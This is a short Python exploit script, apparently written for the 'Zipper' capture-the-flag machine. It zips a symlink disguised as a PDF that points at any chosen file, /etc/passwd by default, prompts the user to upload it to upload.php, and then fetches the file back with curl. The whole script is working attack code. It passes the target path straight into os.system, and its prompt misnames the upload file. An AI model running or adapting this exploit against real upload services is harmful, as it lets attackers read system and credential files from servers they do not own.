#this is a lfi exploit for zipper
#usage: python3 exploit.py -c "file to reach"

import os, argparse

parser = argparse.ArgumentParser(description="lfi exploiter for zipper")
parser.add_argument("-c", "--command", dest="command", help="the file you want to read", default="/etc/passwd")

machine_ip = "10.10.11.229"

def make_files(command="/etc/passwd"):
    os.system(f"ln -s {command} payload.pdf")
    os.system(f"zip --symlinks payload.zip payload.pdf")
    os.system(f"rm payload.pdf")
    input(f"send Payload.sip to http://{machine_ip}/upload.php and press enter to continue")
    location = input("Enter the location of the payload file on the server (uploads/*numbers*/payload.pdf): ")
    print()
    os.system(f"curl http://{machine_ip}/{location}")

make_files(parser.parse_args().command)